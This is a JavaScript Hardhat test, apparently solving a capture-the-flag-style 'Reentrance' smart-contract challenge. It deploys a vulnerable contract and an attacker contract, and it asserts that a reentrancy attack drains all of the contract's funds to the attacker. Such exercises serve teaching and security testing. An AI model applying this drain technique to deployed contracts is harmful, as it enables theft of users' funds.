const { expect } = require("chai");
const { ethers } = require("hardhat");

/**
 * Vulnerable contract sends funds before deducting it, this allows withdrawing 
 * in a loop until balance is depleted.
 */

describe("Reentrance", async () => {

    it("should steal", async function () {
        [owner, attacker, third] = await ethers.getSigners();

        const Reentrance = await ethers.getContractFactory("Reentrance");
        const contract = await Reentrance.deploy();
        await contract.deployed();

        const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
        const hack = await ReentranceHack.connect(attacker).deploy(contract.address);
        await hack.deployed();

        // donating the hack contract allows it to initiate a withdraw
        await contract.connect(attacker).donate(hack.address, {value: "100"});

        // adding some funds to the contract to be stolen
        await contract.donate(third.address, {value: "9900"});

        // make sure hack contract has only 100
        expect(await contract.balanceOf(hack.address)).to.equal("100");

        await hack.withdraw();

        // hack contract got all funds
        expect(await ethers.provider.getBalance(hack.address)).to.equal("10000");

        // none left in contract
        expect(await ethers.provider.getBalance(contract.address)).to.equal("0");
    });

});